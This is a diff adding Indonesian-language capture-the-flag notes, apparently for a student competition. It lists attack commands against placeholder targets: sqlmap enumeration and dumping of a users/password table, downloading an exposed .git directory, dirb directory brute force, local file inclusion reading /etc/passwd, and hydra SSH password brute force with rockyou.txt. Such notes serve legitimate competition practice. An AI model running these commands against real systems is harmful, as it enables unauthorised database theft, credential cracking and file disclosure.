@@ -195,4 +195,49 @@ Ini isi nya :
 
 tambahan
 
+Scaning semua port, lalu rekap,ingat semua port yang terbuka
+
+sqlmap -u “http://ip:port/login.php”  --forms –dbs
+sqlmap -u “http://ip:port/login.php”  --forms -D ctf_db –tables
+sqlmap -u “http://ip:port/login.php”  --forms -D ctf_db -T users --columns
+sqlmap -u “http://ip:port/login.php”  --forms -D ctf_db -T users -C password –dump
+(ambil)
+
+sqlmap -u “http://ip:port/login.php”  --forms -D lksdepok2025 –tables
+sqlmap -u “http://ip:port/login.php”  --forms -D lksdepok2025 -T yang_mana --Columns
+sqlmap -u “http://ip:port/login.php”  --forms -D lksdepok2025 -T yang_mana -C secure_files --dump
+(hint nya,lalu search)
+
+wget -r http://ip:port/.git/
+cd ip (yang warna biru)
+git log
+git show ip 🡪 kode yang mencurigakan
+
+
+dirb http://ip:3000 
+salin link yang di temuka dirb
+http://ip:3000/api
+http://users/1
+# yg ini semoga jangan ke kirim dulu
+
+Buka Pada browser
+http://ip:port/login.php?page=info.php
+http://ip:port/login.php?page=/etc/passwd
+http://ip:port/login.php?page=rce_flag.txt
+
+cd /usr/share/wordlist
+nano user.txt 
+(masukan usernya , ctf_user , bruteforce_user , another_user)
+hydra -L user.txt -P rockyou.txt -t 4 ssh://ip:port
+ssh bruteforce_user@ip -p 2222 ( masukan password yang di dapat)
+ls
+cat (nama flag nya)
+
+
+ssh another_user@ip -p 2222
+(masukan flag sebelum nya sebagai password)
+Ls
+cat (nama file nya)
+
+
 
